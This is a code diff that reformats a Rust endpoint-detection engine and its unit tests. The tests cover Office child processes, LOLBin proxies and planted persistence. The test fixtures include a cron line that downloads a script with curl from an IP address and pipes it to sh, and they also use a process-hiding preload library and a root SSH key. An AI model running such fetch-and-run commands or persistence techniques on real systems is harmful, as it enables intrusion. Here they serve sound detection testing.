@@ -203,14 +203,25 @@ impl RuleId {
 }
 
 const OFFICE: &[&str] = &[
-    "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe", "onenote.exe", "msaccess.exe", "mspub.exe", "visio.exe", "acrord32.exe",
-    "acrobat.exe", "soffice.bin", "microsoft word", "microsoft excel", "microsoft powerpoint", "microsoft outlook",
+    "winword.exe",
+    "excel.exe",
+    "powerpnt.exe",
+    "outlook.exe",
+    "onenote.exe",
+    "msaccess.exe",
+    "mspub.exe",
+    "visio.exe",
+    "acrord32.exe",
+    "acrobat.exe",
+    "soffice.bin",
+    "microsoft word",
+    "microsoft excel",
+    "microsoft powerpoint",
+    "microsoft outlook",
 ];
 const SHELLS: &[&str] = &["powershell.exe", "pwsh.exe", "pwsh", "cmd.exe", "wscript.exe", "cscript.exe", "bash", "sh", "zsh", "dash", "fish", "osascript"];
-const PROXIES: &[&str] = &[
-    "rundll32.exe", "regsvr32.exe", "mshta.exe", "certutil.exe", "bitsadmin.exe", "msiexec.exe", "installutil.exe", "wmic.exe", "cmstp.exe",
-    "odbcconf.exe",
-];
+const PROXIES: &[&str] =
+    &["rundll32.exe", "regsvr32.exe", "mshta.exe", "certutil.exe", "bitsadmin.exe", "msiexec.exe", "installutil.exe", "wmic.exe", "cmstp.exe", "odbcconf.exe"];
 const SERVERS: &[&str] = &["w3wp.exe", "sqlservr.exe", "httpd", "apache2", "nginx", "php-fpm", "postgres", "mysqld", "mariadbd", "redis-server", "mongod"];
 const POWERSHELLS: &[&str] = &["powershell.exe", "pwsh.exe", "pwsh"];
 
@@ -310,8 +321,17 @@ impl State {
 
     fn process(&mut self, index: u64, event: &ProcessEvent) -> Vec<Match> {
         if matches!(event.action, ProcessAction::Terminate) {
-            let ended = self.live.get(&event.pid).filter(|process| self.fired.iter().any(|(_, pid, started_at)| *pid == event.pid && *started_at == process.started_at));
-            let follow_up = ended.map(|process| Match { trigger: index, rule: RuleId::FlaggedProcessEnded, context: vec![process.index], pid: event.pid, started_at: process.started_at });
+            let ended = self
+                .live
+                .get(&event.pid)
+                .filter(|process| self.fired.iter().any(|(_, pid, started_at)| *pid == event.pid && *started_at == process.started_at));
+            let follow_up = ended.map(|process| Match {
+                trigger: index,
+                rule: RuleId::FlaggedProcessEnded,
+                context: vec![process.index],
+                pid: event.pid,
+                started_at: process.started_at,
+            });
             self.forget(event.pid);
             return follow_up.into_iter().collect();
         }
@@ -455,11 +475,29 @@ mod tests {
     fn run(timestamp: u64, pid: u32, ppid: u32, path: &str, args: &[&str]) -> SensorEvent {
         let mut command_line = vec![path.to_string()];
         command_line.extend(args.iter().map(|arg| arg.to_string()));
-        SensorEvent::Process(ProcessEvent { timestamp, pid, ppid, executable_path: path.to_string(), command_line, action: ProcessAction::Create, uid: 1000, hash: None })
+        SensorEvent::Process(ProcessEvent {
+            timestamp,
+            pid,
+            ppid,
+            executable_path: path.to_string(),
+            command_line,
+            action: ProcessAction::Create,
+            uid: 1000,
+            hash: None,
+        })
     }
 
     fn end(timestamp: u64, pid: u32) -> SensorEvent {
-        SensorEvent::Process(ProcessEvent { timestamp, pid, ppid: 0, executable_path: String::new(), command_line: Vec::new(), action: ProcessAction::Terminate, uid: 0, hash: None })
+        SensorEvent::Process(ProcessEvent {
+            timestamp,
+            pid,
+            ppid: 0,
+            executable_path: String::new(),
+            command_line: Vec::new(),
+            action: ProcessAction::Terminate,
+            uid: 0,
+            hash: None,
+        })
     }
 
     fn connect(timestamp: u64, pid: u32) -> SensorEvent {
@@ -506,7 +544,10 @@ mod tests {
                 connect(6, 12),
             ],
         );
-        assert_eq!(fired, vec!["office-child", "encoded-command", "hidden-window", "shell-network", "drops-executable", "proxy-loads-writable", "proxy-network"]);
+        assert_eq!(
+            fired,
+            vec!["office-child", "encoded-command", "hidden-window", "shell-network", "drops-executable", "proxy-loads-writable", "proxy-network"]
+        );
     }
 
     #[test]
@@ -552,13 +593,28 @@ mod tests {
         let shell = run(100, 40, 0, "/bin/bash", &["deploy.sh"]);
         assert_eq!(rules(&mut state, &[shell.clone(), connect(101, 40), connect(102, 40), shell, connect(103, 40)]), vec!["shell-network"]);
 
-        assert_eq!(rules(&mut state, &[end(110, 40), run(120, 40, 0, "/bin/bash", &["deploy.sh"]), connect(121, 40)]), vec!["flagged-process-ended", "shell-network"]);
+        assert_eq!(
+            rules(&mut state, &[end(110, 40), run(120, 40, 0, "/bin/bash", &["deploy.sh"]), connect(121, 40)]),
+            vec!["flagged-process-ended", "shell-network"]
+        );
     }
 
     #[test]
     fn test_the_end_of_a_process_is_opened_only_when_that_process_had_a_finding() {
         let mut state = State::default();
-        let found = matches(&mut state, 50, &[run(1, 20, 0, "/usr/sbin/nginx", &[]), run(2, 21, 20, "/bin/sh", &["-c", "id"]), run(3, 22, 0, "/usr/bin/sleep", &["60"]), end(4, 22), end(5, 21), end(6, 20), end(7, 21)]);
+        let found = matches(
+            &mut state,
+            50,
+            &[
+                run(1, 20, 0, "/usr/sbin/nginx", &[]),
+                run(2, 21, 20, "/bin/sh", &["-c", "id"]),
+                run(3, 22, 0, "/usr/bin/sleep", &["60"]),
+                end(4, 22),
+                end(5, 21),
+                end(6, 20),
+                end(7, 21),
+            ],
+        );
         assert_eq!(
             found,
             vec![
@@ -587,22 +643,53 @@ mod tests {
     }
 
     fn autostart(action: InventoryAction, kind: PersistenceKind, name: &str, path: &str, command: &str, user: &str) -> SensorEvent {
-        SensorEvent::Persistence(PersistenceEvent { timestamp: 500, action, kind, name: name.to_string(), path: path.to_string(), command: command.to_string(), user: user.to_string(), enabled: true, hash: None })
+        SensorEvent::Persistence(PersistenceEvent {
+            timestamp: 500,
+            action,
+            kind,
+            name: name.to_string(),
+            path: path.to_string(),
+            command: command.to_string(),
+            user: user.to_string(),
+            enabled: true,
+            hash: None,
+        })
     }
 
     #[test]
     fn test_planted_autostart_items_are_found_and_ordinary_ones_are_quiet() {
         let mut state = State::default();
-        let planted = autostart(InventoryAction::Added, PersistenceKind::Cron, "sysupdate", "/etc/cron.d/sysupdate", "* * * * * root curl -fsS http://203.0.113.47/u | sh", "root");
+        let planted = autostart(
+            InventoryAction::Added,
+            PersistenceKind::Cron,
+            "sysupdate",
+            "/etc/cron.d/sysupdate",
+            "* * * * * root curl -fsS http://203.0.113.47/u | sh",
+            "root",
+        );
         let found = state.observe(7, &planted);
         assert_eq!(found, vec![Match { trigger: 7, rule: RuleId::AutostartFetch, context: Vec::new(), pid: 0, started_at: 500 }]);
         assert_eq!(found[0].rule.technique_for(PersistenceKind::Cron), "T1053.003");
 
-        let resent = autostart(InventoryAction::Present, PersistenceKind::Cron, "sysupdate", "/etc/cron.d/sysupdate", "* * * * * root curl -fsS http://203.0.113.47/u | sh", "root");
+        let resent = autostart(
+            InventoryAction::Present,
+            PersistenceKind::Cron,
+            "sysupdate",
+            "/etc/cron.d/sysupdate",
+            "* * * * * root curl -fsS http://203.0.113.47/u | sh",
+            "root",
+        );
         assert!(state.observe(8, &resent).is_empty(), "an agent that looks again reports the item again");
 
         let quiet = [
-            autostart(InventoryAction::Present, PersistenceKind::SystemdUnit, "ssh.service", "/usr/lib/systemd/system/ssh.service", "/usr/sbin/sshd -D", "root"),
+            autostart(
+                InventoryAction::Present,
+                PersistenceKind::SystemdUnit,
+                "ssh.service",
+                "/usr/lib/systemd/system/ssh.service",
+                "/usr/sbin/sshd -D",
+                "root",
+            ),
             autostart(InventoryAction::Added, PersistenceKind::Cron, "certbot", "/etc/cron.d/certbot", "0 */12 * * * root certbot -q renew", "root"),
             autostart(InventoryAction::Present, PersistenceKind::AuthorizedKey, "admin@laptop", "/root/.ssh/authorized_keys", "ssh-ed25519", "root"),
             autostart(InventoryAction::Present, PersistenceKind::LdPreload, "libjemalloc.so", "/etc/ld.so.preload", "/usr/lib/libjemalloc.so", "root"),
@@ -611,8 +698,22 @@ mod tests {
         assert!(rules(&mut state, &quiet).is_empty());
 
         let loud = [
-            autostart(InventoryAction::Added, PersistenceKind::SystemdUnit, "dbus-helper.service", "/etc/systemd/system/dbus-helper.service", "/tmp/.cache/kworker", "root"),
-            autostart(InventoryAction::Added, PersistenceKind::LdPreload, "libprocesshider.so", "/etc/ld.so.preload", "/usr/local/lib/libprocesshider.so", "root"),
+            autostart(
+                InventoryAction::Added,
+                PersistenceKind::SystemdUnit,
+                "dbus-helper.service",
+                "/etc/systemd/system/dbus-helper.service",
+                "/tmp/.cache/kworker",
+                "root",
+            ),
+            autostart(
+                InventoryAction::Added,
+                PersistenceKind::LdPreload,
+                "libprocesshider.so",
+                "/etc/ld.so.preload",
+                "/usr/local/lib/libprocesshider.so",
+                "root",
+            ),
             autostart(InventoryAction::Added, PersistenceKind::AuthorizedKey, "root@build", "/root/.ssh/authorized_keys", "ssh-ed25519", "root"),
         ];
         assert_eq!(rules(&mut state, &loud), ["autostart-writable", "preload-added", "root-key-added"]);
